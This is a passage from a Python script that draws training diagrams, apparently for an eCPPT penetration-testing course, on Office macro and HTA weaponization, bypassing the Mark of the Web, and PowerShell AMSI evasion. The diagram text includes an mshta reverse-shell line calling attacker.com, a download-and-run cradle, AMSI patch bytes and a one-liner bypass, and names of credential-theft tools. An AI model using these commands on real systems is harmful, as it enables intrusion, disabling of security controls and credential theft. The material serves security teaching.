        ("4. MOTW Container Bypass", "Payload wrapped in ISO/VHD\nWindows mounts virtual disk\nZone.Identifier ADS stripped!\nLNK executes PowerShell", (16, 185, 129), 815)
    ]
    for stitle, sdesc, scol, sx in stages:
        draw.rounded_rectangle([(sx, 100), (sx + 230, 240)], radius=8, fill=(scol[0], scol[1], scol[2], 25), outline=scol, width=2)
        draw.text((sx + 12, 115), stitle, fill=scol, font=FONT_BOLD)
        lines = sdesc.split("\n")
        ly = 145
        for l in lines:
            draw.text((sx + 12, ly), l, fill=(203, 213, 225), font=FONT_REGULAR)
            ly += 22

    # Middle: Office VBA & HTA
    draw.rounded_rectangle([(45, 260), (1055, 480)], radius=8, fill=(15, 23, 42, 220), outline=(236, 72, 153), width=2)
    draw.text((65, 275), "Weaponization Methods: Office VBA Macros & HTML Applications (HTA)", fill=(236, 72, 153), font=FONT_BOLD)
    draw.text((65, 305), "• VBA Macro (.docm / .xlsm): AutoOpen() & Document_Open() execute VBA upon document load.", fill=(245, 158, 11), font=FONT_BOLD)
    draw.text((65, 330), "  Utilizes Win32 APIs (VirtualAlloc, RtlMoveMemory, CreateThread) or WScript.Shell to spawn hidden PowerShell.\n  Obfuscated via MacroPack to defeat static antivirus signatures.", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((65, 390), "• HTML Application (.hta): Executed by native Windows mshta.exe utility completely outside browser sandbox.", fill=(56, 189, 248), font=FONT_BOLD)
    draw.text((65, 415), "  Contains embedded VBScript/JScript executing arbitrary commands with full user permissions:\n  mshta.exe http://attacker.com/payload.hta (instant reverse shell).", fill=(203, 213, 225), font=FONT_REGULAR)

    # Bottom
    draw.rounded_rectangle([(45, 500), (1055, 595)], radius=6, fill=(30, 41, 59, 180), outline=(71, 85, 105), width=1)
    draw.text((65, 512), "MARK-OF-THE-WEB (MOTW) EVASION RULE:", fill=(239, 68, 68), font=FONT_CODE)
    draw.text((65, 535), "Directly downloaded .exe or .docm files receive Zone.Identifier=3, prompting SmartScreen warnings and macro blocking.", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((65, 560), "Encapsulating payloads inside an .iso or .vhd image strips the zone identifier when mounted by Windows Explorer.", fill=(16, 185, 129), font=FONT_REGULAR)

    img.save(f"{out_dir}/part-9-diagram.png", "PNG")
    print("Generated part-9-diagram.png")

# 10. Part 10: PowerShell & AMSI
def gen_part10():
    img, draw = create_base(1100, 620, "PART 10: OFFENSIVE POWERSHELL & AMSI EVASION ARCHITECTURE", "Living-off-the-Land (LotL), PowerSploit Modular Ecosystem, and AmsiScanBuffer In-Memory Patching")
    
    # 3 Columns
    cols = [
        ("1. In-Memory Execution", [
            "• Living-off-the-Land (LotL)",
            "• WebClient Download Cradle:",
            "  IEX (New-Object Net.WebClient)",
            "  .DownloadString('http://...')",
            "• Completely fileless in RAM",
            "• Direct .NET & Win32 API access"
        ], (56, 189, 248), 45),
        ("2. PowerSploit Arsenal", [
            "• PowerView: Active Directory auditing",
            "  Get-DomainUser, Find-LocalAdminAccess",
            "• PowerUp: Local privilege escalation",
            "  Invoke-AllChecks, Write-ServiceExec",
            "• Code Execution: Invoke-Shellcode",
            "• Credentials: Invoke-Mimikatz"
        ], (245, 158, 11), 385),
        ("3. AMSI Memory Patch Hook", [
            "• amsi.dll loaded in powershell.exe",
            "• Resolve AmsiScanBuffer entry point",
            "• VirtualProtect -> RWX (0x40)",
            "• Write patch: mov eax, 0x80070057; ret",
            "• Returns E_INVALIDARG immediately!",
            "• Windows Defender blinded in process"
        ], (239, 68, 68), 725)
    ]
    for ctitle, citems, ccol, cx in cols:
        draw.rounded_rectangle([(cx, 100), (cx + 330, 360)], radius=8, fill=(ccol[0], ccol[1], ccol[2], 25), outline=ccol, width=2)
        draw.text((cx + 15, 115), ctitle, fill=ccol, font=FONT_BOLD)
        cy = 155
        for it in citems:
            draw.text((cx + 15, cy), it, fill=(203, 213, 225), font=FONT_REGULAR)
            cy += 32

    # Bottom: AMSI Mechanics Box
    draw.rounded_rectangle([(45, 380), (1055, 595)], radius=8, fill=(15, 23, 42, 220), outline=(16, 185, 129), width=2)
    draw.text((65, 395), "In-Memory AMSI Bypass Mechanics: User-Mode Hooking without Admin Rights", fill=(16, 185, 129), font=FONT_BOLD)
    draw.text((65, 425), "Because amsi.dll runs within the user's unprivileged powershell.exe process space, the process has legitimate rights to modify its own pages.", fill=(203, 213, 225), font=FONT_REGULAR)
    draw.text((65, 455), "x64 Hex Bytes: B8 57 00 07 80 C3   (mov eax, 0x80070057; ret)", fill=(245, 158, 11), font=FONT_CODE)
    draw.text((65, 485), "One-Liner Bypass: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", fill=(56, 189, 248), font=FONT_CODE)
    draw.text((65, 520), "AST OBFUSCATION: Invoke-Obfuscation applies string token reversal, tick insertion, and environment variable slicing to bypass Event ID 4104 Script Block Logging.", fill=(203, 213, 225), font=FONT_REGULAR)

    img.save(f"{out_dir}/part-10-diagram.png", "PNG")
    print("Generated part-10-diagram.png")

if __name__ == "__main__":
    gen_part1()
    gen_part2()
    gen_part3()
    gen_part4()
    gen_part5()
    gen_part6()
    gen_part7()
    gen_part8()
    gen_part9()
    gen_part10()
    print("All 10 eCPPT diagrams generated successfully!")
